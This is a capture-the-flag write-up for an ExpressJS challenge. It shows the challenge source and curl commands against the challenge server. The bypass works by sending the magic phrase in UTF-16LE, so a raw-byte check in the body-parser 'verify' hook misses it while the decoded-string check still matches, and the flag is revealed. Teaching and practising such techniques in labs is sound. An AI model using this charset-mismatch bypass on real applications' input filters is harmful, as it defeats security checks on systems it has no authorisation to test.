# Gynvael Coldwind ExpressJS challenge 4

Source: https://twitter.com/gynvael/status/1260499214225809409

## Challenge

We are provided with this code on the web page:
```javascript
const express = require('express')
const fs = require('fs')
const path = require('path')

const PORT = 5004
const FLAG = process.env.FLAG || "???"
const SOURCE = fs.readFileSync(path.basename(__filename))

const app = express()

app.use(express.text({
  verify: (req, res, body) => {
    const magic = Buffer.from('ShowMeTheFlag')

    if (body.includes(magic)) {
      throw new Error("Go away.")
    }
  }
}))

app.post('/flag', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')
  if ((typeof req.body) !== 'string') {
    res.end("What?")
    return
  }

  if (req.body.includes('ShowMeTheFlag')) {
    res.end(FLAG)
    return
  }

  res.end("Say the magic phrase!")
})

app.get('/', (req, res) => {
  res.statusCode = 200
  res.setHeader('Content-Type', 'text/plain;charset=utf-8')
  res.write("Level 4\n\n")
  res.end(SOURCE)
})

app.listen(PORT, () => {
  console.log(`Challenge listening at port ${PORT}`)
})
```

## Analysis

There are several things that reveal what needs to be done, here are some important points:
- `if (body.includes(magic))`
- `if ((typeof req.body) !== 'string')`
- `if (req.body.includes('ShowMeTheFlag'))`

First things first: the `typeof req.body` needs to be `string`. As per [documentation](https://expressjs.com/en/5x/api.html#req.body) the `req.body` will be `undefined` by default, but it's type will be determined per provided `Content-Type`. This can be easily tested and verified:
```sh
$ curl -d "ShowMeTheFlag" http://challenges.gynvael.stream:5004/flag -v
*   Trying 35.204.139.205:5004...
* TCP_NODELAY set
* Connected to challenges.gynvael.stream (35.204.139.205) port 5004 (#0)
> POST /flag HTTP/1.1
> Host: challenges.gynvael.stream:5004
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 13
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 13 out of 13 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: text/plain;charset=utf-8
< Date: Wed, 13 May 2020 19:49:42 GMT
< Connection: keep-alive
< Content-Length: 5
< 
* Connection #0 to host challenges.gynvael.stream left intact
What?
```

After changing `Content-Type`:
```sh
$ curl -d "ShowMeTheFlag" http://challenges.gynvael.stream:5004/flag -vv -H "Content-Type: text/plain"
*   Trying 35.204.139.205:5004...
* TCP_NODELAY set
* Connected to challenges.gynvael.stream (35.204.139.205) port 5004 (#0)
> POST /flag HTTP/1.1
> Host: challenges.gynvael.stream:5004
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Type: text/plain
> Content-Length: 13
> 
* upload completely sent off: 13 out of 13 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< X-Powered-By: Express
< Content-Security-Policy: default-src 'none'
< X-Content-Type-Options: nosniff
< Content-Type: text/html; charset=utf-8
< Content-Length: 742
< Date: Wed, 13 May 2020 19:51:33 GMT
< Connection: keep-alive
< 
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Go away.<br> &nbsp; &nbsp;at verify (/usr/src/app/app.js:16:13)<br> &nbsp; &nbsp;at /usr/src/app/node_modules/body-parser/lib/read.js:104:9<br> &nbsp; &nbsp;at invokeCallback (/usr/src/app/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/usr/src/app/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/usr/src/app/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:322:22)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1187:12)<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:84:21)</pre>
</body>
</html>
* Connection #0 to host challenges.gynvael.stream left intact
```

What we have done here is: we specified that our body is `text/plain` from which Express determined that our body is of type `string` - therefore passing the first check.

Since we see that there is an error, this means that we have failed the verification part:
```
verify: (req, res, body) => {
    const magic = Buffer.from('ShowMeTheFlag')

    if (body.includes(magic)) {
        throw new Error("Go away.")
    }
}
```

Digging into the documentation further, there is a [note](https://expressjs.com/en/api.html#express.text) that there is a `type` property that defines what media type the middleware will parse and it defaults to our `text/plain` content type. This means that we cannot skip this verification and should find a way so that the two checks (`body.includes(magic)` and `req.body.includes('ShowMeTheFlag')`) interpret the data in a different way.

Well, since `body.includes(magic)` check compares `Buffer`s and `req.body.includes('ShowMeTheFlag')` check compares `string`s, we should be able to specify text in a way that the string gets transformed to `ShowMeTheFlag` when its sent to the server, but its byte content on wire is different. And then it hit me: we can specify a different charset in the `text/plain` content type.

## Solution

To solve this challenge, specify `ShowMeTheFlag` payload in a different charset and specify the charset that you used in the `Content-Type`.

This works because the `verify` function will check the raw byte content which will not be the same as `ShowMeTheFlag`:
```sh
echo "ShowMeTheFlag" | iconv -t UTF-16LE -o - | xxd
00000000: 5300 6800 6f00 7700 4d00 6500 5400 6800  S.h.o.w.M.e.T.h.
00000010: 6500 4600 6c00 6100 6700 0a00            e.F.l.a.g...
```

When the same input is checked with `req.body.includes('ShowMeTheFlag')`, the string will be interpreted by Express as the expected `ShowMeTheFlag`:

```
$ echo "ShowMeTheFlag" | iconv -t UTF-16LE -o - | curl -X POST --data-binary "@-" http://challenges.gynvael.stream:5004/flag -H "Content-Type: text/plain; charset=UTF-16LE"
CTF{||ButVerify()WasSupposedToProtectUs!||}
```
